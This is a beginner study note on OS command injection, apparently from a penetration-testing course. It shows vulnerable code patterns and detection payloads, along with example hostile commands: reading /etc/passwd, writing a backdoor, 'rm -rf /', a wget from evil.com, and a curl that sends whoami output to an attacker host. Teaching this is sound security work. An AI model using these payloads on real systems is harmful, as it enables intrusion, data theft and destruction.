---
tags: [vapt, command-injection, beginner]
difficulty: beginner
module: "08 - Command Injection"
topic: "08.01 What is Command Injection?"
portswigger_labs: ["Command injection"]
---

# 08.01 — What is Command Injection?

## Core Concept

Command Injection (OS Command Injection) occurs when an application passes unsanitized user input to a system shell. Instead of running the intended command, the attacker injects additional OS commands that the server executes with the application's privileges.

```
NORMAL USAGE:
  App wants to ping a host:
  system("ping -c 1 " + user_input)
  User enters: 8.8.8.8
  Command runs: ping -c 1 8.8.8.8   ← legitimate!

ATTACKED:
  User enters: 8.8.8.8; cat /etc/passwd
  Command runs: ping -c 1 8.8.8.8; cat /etc/passwd
                                  ↑ second command injected!
  Output: [ping results] + [contents of /etc/passwd]!
```

---

## Why This Happens

Developers often need to run OS commands from application code — file operations, network utilities, image processing, PDF generation. If user input flows into these commands without sanitization, the OS interprets the input as shell syntax.

```
VULNERABLE CODE PATTERNS:

PHP:
  system("ping " . $_GET['host']);
  exec("nslookup " . $domain);
  shell_exec("convert " . $filename . " output.pdf");
  passthru("whois " . $ip);
  popen("dig " . $domain, "r");
  `ls ` . $dir;   ← backtick operator!

Python:
  os.system("ping " + host)
  subprocess.call("nslookup " + domain, shell=True)  ← shell=True is dangerous!
  subprocess.check_output("ping " + ip, shell=True)

Node.js:
  exec("ping " + ip)
  execSync("ls " + directory)
  spawn("sh", ["-c", "ping " + ip])   ← when combined to single string

Ruby:
  system("ping #{host}")
  `ping #{host}`
  IO.popen("nslookup #{domain}")

Java:
  Runtime.exec("ping " + host)   ← less dangerous (no shell)
  new ProcessBuilder("/bin/sh", "-c", "ping " + host)  ← dangerous (uses shell)
```

---

## Impact

```
IMPACT SCALE:
  
  LOW:
    Reading files: cat /etc/passwd
    Listing directories: ls /var/www
  
  HIGH:
    Reading secrets: cat /etc/shadow, .env, config.php
    Writing files: echo "backdoor" > /var/www/html/shell.php
    Downloading tools: wget https://evil.com/shell
  
  CRITICAL:
    Reverse shell: complete interactive access to the server!
    Data exfiltration: dump entire database files
    Lateral movement: attack other internal servers
    Persistence: add SSH keys, create cron jobs
    Ransomware/destruction: rm -rf /
```

---

## Command Injection vs SQL Injection

```
SQL INJECTION:          Input → SQL query → Database
COMMAND INJECTION:      Input → OS command → Shell

BOTH:
  ✓ Unsanitized user input
  ✓ Injected into a "query language" (SQL or shell)
  ✓ Can read, write, and execute

COMMAND INJECTION IS OFTEN MORE IMPACTFUL:
  SQL injection → database compromise
  Command injection → full server compromise (OS level!)
```

---

## Types of Command Injection

```
1. IN-BAND (Visible in response):
   Output of injected command appears in HTTP response
   Example: ?host=127.0.0.1;cat /etc/passwd
   → /etc/passwd contents appear in response

2. BLIND — TIME-BASED:
   No output, but: injected command causes a delay
   Example: ?host=127.0.0.1;sleep 10
   → Response takes 10+ seconds → injection confirmed!

3. BLIND — OUT-OF-BAND (OOB):
   No output in response, no timing
   Command makes outbound connection to attacker
   Example: ?host=127.0.0.1;curl https://evil.com/?$(whoami)
   → Attacker receives request with username!
   → Uses Burp Collaborator or Interactsh
```

---

## Basic Detection Payload Set

```bash
# INJECTION OPERATOR TESTS:
# Try appending these after a normal value:

; id              → runs 'id' command after semicolon
| id              → pipes output to 'id'
|| id             → runs 'id' if first command fails
& id              → runs 'id' in background
&& id             → runs 'id' if first command succeeds
` id `            → command substitution (backtick)
$(id)             → command substitution (modern)
%0aid             → URL-encoded newline then id

# EXAMPLE TEST:
# Normal: ?ip=8.8.8.8
# Test:   ?ip=8.8.8.8;id
# Test:   ?ip=8.8.8.8|id
# Test:   ?ip=8.8.8.8||id
# Test:   ?ip=8.8.8.8&&id
# Test:   ?ip=8.8.8.8`id`
# Test:   ?ip=8.8.8.8$(id)

# IF RESPONSE CONTAINS: uid=33(www-data) gid=33(www-data)
# → COMMAND INJECTION CONFIRMED!
```

---

## Where to Look for Command Injection

```
HIGH-PROBABILITY LOCATIONS:
  ✓ IP address / hostname input fields (ping, nslookup, traceroute)
  ✓ File name fields (image resize, PDF convert, file search)
  ✓ URL/domain input fields (whois, dig, curl)
  ✓ Email fields (sendmail, notification systems)
  ✓ Username/user-agent fields (if used in system logging)
  ✓ Import/export functionality (ffmpeg, imagemagick, wkhtmltopdf)
  ✓ "Test connection" features (database host, SMTP server)
  ✓ Backup/restore features
  ✓ Search functionality that uses grep/find
```

---

## ASCII Diagram: Command Injection Flow

```
USER INPUT          APPLICATION          OS SHELL          FILESYSTEM
-----------         -----------          --------          ----------
"8.8.8.8"           system("ping        ping -c 1
                     8.8.8.8")           8.8.8.8
                                               |
                                          [ping output]
                                               |
USER INJECT:        system("ping        ping -c 1          cat /etc/passwd
"8.8.8.8;cat         8.8.8.8;cat         8.8.8.8           [reads file]
/etc/passwd")        /etc/passwd")                               |
                                                            [file contents]
                          ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
                         BOTH RESULTS RETURNED IN RESPONSE!
```

---

## Related Notes
- [[02 - OS Command Injection Linux]] — Linux-specific injection
- [[03 - OS Command Injection Windows]] — Windows-specific
- [[04 - Blind Command Injection]] — no-output injection
- [[10 - Command Injection to Reverse Shell]] — full exploitation
- [[Module 06 - SQL Injection]] — similar concept, different target
